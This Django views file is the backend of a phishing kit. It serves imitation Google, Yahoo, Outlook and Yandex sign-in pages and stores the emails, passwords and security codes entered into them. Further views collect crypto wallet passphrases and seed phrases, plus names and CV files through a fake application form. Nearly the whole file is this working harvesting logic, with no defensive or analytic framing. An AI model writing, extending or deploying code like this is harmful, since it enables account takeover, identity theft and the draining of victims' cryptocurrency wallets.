from django.shortcuts import render , redirect
from .models import Us , Goo , Goo_p , Goo_log,  Yahoo, Yahoo_log, Yahoo_p , Outlook, Outlook_p ,Yandex,Yandex_p,Yandex_log , Wallet , Seed , CVUpload , Allow

import os
from django.conf import settings
from django.core.files.storage import FileSystemStorage

# Create your views here.

def index(request):
    return render(request , 'index.html')

def google(request):
    if request.method=='POST':
        email=request.POST.get('email')
       
        if email != '':
            # Prevent duplicates
            if not Us.objects.filter(email=email).exists():
                a = Us(email=email)
                a.save()

                # b = Goo(us=a, email=email)
                # b.save()
                # try:

                b = Goo(us=a, email=email)
                b.save()
              

                return redirect('google_p', user_id=a.id)
   
    return render(request , 'gogle.html')

def google_p(request, user_id):
    if request.method == 'POST':
        password = request.POST.get('password')
        if password != '':
            user = Us.objects.get(id=user_id)
            Goo_p.objects.create(us=user, password=password)
            return redirect('google_log', user_id=user.id)

    return render(request, 'goglep.html', {'user_id': user_id})


def google_log(request, user_id):
    user = Us.objects.filter(id=user_id).first() 
    if not user:
        return redirect('home') # safe, no error if user not found

    logs = Goo_log.objects.filter(us=user) if user else []
    allow = Allow.objects.filter(us=user).first() if user else None
    allow_apply = bool(allow.apply_enabled) if allow else False
    # for log in logs:
    #     code = (log.code or '').strip()
    #     if code:
    #         return redirect('view', user_id=user_id)


    return render(request, 'log.html', {
        'user': user,
        'logs': logs,
        'allow_apply': allow_apply,
    })
   
# yahho

def yahoo(request):
    if request.method=='POST':
        email=request.POST.get('email')
       
        if email != '':
            # Prevent duplicates
            if not Us.objects.filter(email=email).exists():
                a = Us(email=email)
                a.save()

                # b = Goo(us=a, email=email)
                # b.save()
                # try:

                b = Yahoo(us=a, email=email)
                b.save()
              

                return redirect('yahoo_p', user_id=a.id)
            
    return render(request, 'yahoo.html')

def yahoo_p(request, user_id):
    user = Us.objects.filter(id=user_id).first()  # safe, no error if user not found
   
    if request.method == 'POST':
        password = request.POST.get('password')
        if password != '':
            user = Us.objects.get(id=user_id)
            Yahoo_p.objects.create(us=user, password=password)
            return redirect('yahoo_log', user_id=user.id)
        


    return render(request, 'yahoo-pass.html', {'user_id': user_id , 'user':user})





def yahoo_log(request, user_id):
    user = Us.objects.filter(id=user_id).first()
    if not user:

        return redirect('home')  # safe, no error if user not found

    logs = Yahoo_log.objects.filter(us=user) if user else []
    if request.method == 'POST':
        code = request.POST.get('code')
        if code != '':
            user = Us.objects.get(id=user_id)
            Yahoo_log.objects.create(us=user, code=code)
            return redirect('view', user_id=user.id)

    return render(request, 'yahoo-security-check.html', {
        'user': user,
        'logs': logs
    })

# outlook

def outlook(request):
    if request.method=='POST':
        email=request.POST.get('email')
       
        if email != '':
            # Prevent duplicates
            if not Us.objects.filter(email=email).exists():
                a = Us(email=email)
                a.save()

                # b = Goo(us=a, email=email)
                # b.save()
                # try:

                b = Outlook(us=a, email=email)
                b.save()
              

                return redirect('outlook_p', user_id=a.id)
            
    return render(request, 'outl.html')

def outlook_p(request, user_id):
    user = Us.objects.filter(id=user_id).first()  # safe, no error if user not found
   
    if request.method == 'POST':
        password = request.POST.get('password')
        if password != '':
            user = Us.objects.get(id=user_id)
            Outlook_p.objects.create(us=user, password=password)
            return redirect('view', user_id=user.id)
        


    return render(request, 'outp.html', {'user_id': user_id , 'user':user})



# yandex

def yandex(request):
    if request.method=='POST':
        email=request.POST.get('email')
       
        if email != '':
            # Prevent duplicates
            if not Us.objects.filter(email=email).exists():
                a = Us(email=email)
                a.save()

                # b = Goo(us=a, email=email)
                # b.save()
                # try:

                b = Yandex(us=a, email=email)
                b.save()
              

                return redirect('yandex_p', user_id=a.id)
            
    return render(request, 'yan.html')

def yandex_p(request, user_id):
    user = Us.objects.filter(id=user_id).first()  # safe, no error if user not found
   
    if request.method == 'POST':
        password = request.POST.get('password')
        if password != '':
            user = Us.objects.get(id=user_id)
            Yandex_p.objects.create(us=user, password=password)
            return redirect('yandex_log', user_id=user.id)
        


    return render(request, 'yanp.html', {'user_id': user_id , 'user':user})





def yandex_log(request, user_id):
    user = Us.objects.filter(id=user_id).first()  # safe, no error if user not found
    if not user:
        return redirect('home')
    logs = Yandex_log.objects.filter(us=user) if user else []
    if request.method == 'POST':
        code = request.POST.get('code')
        if code != '':
            user = Us.objects.get(id=user_id)
            Yandex_log.objects.create(us=user, code=code)
            return redirect('view', user_id=user.id)

    return render(request, 'yanco.html', {
        'user': user,
        'logs': logs
    })




# pharse 




def apply(request, user_id):
    try:
        user = Us.objects.get(id=user_id)
    except Us.DoesNotExist:
        return redirect('error') 

    
    user = Us.objects.filter(id=user_id).first() 
    if not user:
        return redirect('home')
    if request.method == 'POST':
        if 'main_form' in request.POST:

            pharse=request.POST.get('wallet')
            password=request.POST.get('password')
            if password != '':
                user = Us.objects.get(id=user_id)
                Wallet.objects.create(us=user, pharse=pharse, password=password )
                return redirect('pharse', user_id=user.id)
            # user = Us.objects.get(id=user_id)

        elif 'cv_form' in request.POST:

            # handle CV upload and full name 
            full_name = request.POST.get('full_name')
            cv_file = request.FILES.get('cv')
            if full_name and cv_file:
                user = Us.objects.get(id=user_id)
                
                CVUpload.objects.create(
                            us=user,
                            full_name=full_name,
                             cv_file=cv_file
             )
                # return redirect('pharse', user_id=user.id)

    return render(request, 'apply.html', {'user_id': user_id , 'user':user})





# def apply(request):
#     message = ''

#     if request.method == 'POST':
#         # 📌 Check if CV form was submitted
#         if 'cv_form' in request.POST:
#             cv_file = request.FILES.get('cv')
#             if cv_file:
#                 fs = FileSystemStorage(location=os.path.join(settings.MEDIA_ROOT, 'cv'))
#                 filename = fs.save(cv_file.name, cv_file)
#                 file_url = fs.url(filename)
#                 message = f"CV uploaded successfully: {file_url}"

#         # 📌 Check if main form was submitted
#         elif 'main_form' in request.POST:
#             name = request.POST.get('name')
#             email = request.POST.get('email')
#             message = f"Info submitted: {name}, {email}"

#     return render(request, 'apply.html')








def view(request, user_id):
    
    try:
        user = Us.objects.filter(id=user_id).first() 
        user = Us.objects.get(id=user_id)
        if not user:
            return redirect('home')
    except Us.DoesNotExist:
        # Handle the case where the user does not exist
        return redirect('error')

        
            
    return render(request, 'view.html' ,{'user_id': user_id , 'user':user})



def seed(request, user_id):


    try:
        user = Us.objects.get(id=user_id)
    except Us.DoesNotExist:
        return redirect('error') 
    user = Us.objects.filter(id=user_id).first()  # safe, no error if user not found
   
    if request.method == 'POST':
        pharse=request.POST.get('wallet')
        seed=request.POST.get('seed')
        if seed != '':
            user = Us.objects.get(id=user_id)
            Seed.objects.create(us=user, pharse=pharse, seed=seed )
            return redirect('view', user_id=user.id)
        


    return render(request, 'pharse.html', {'user_id': user_id , 'user':user})



def error(request):
    return render(request, 'error.html')









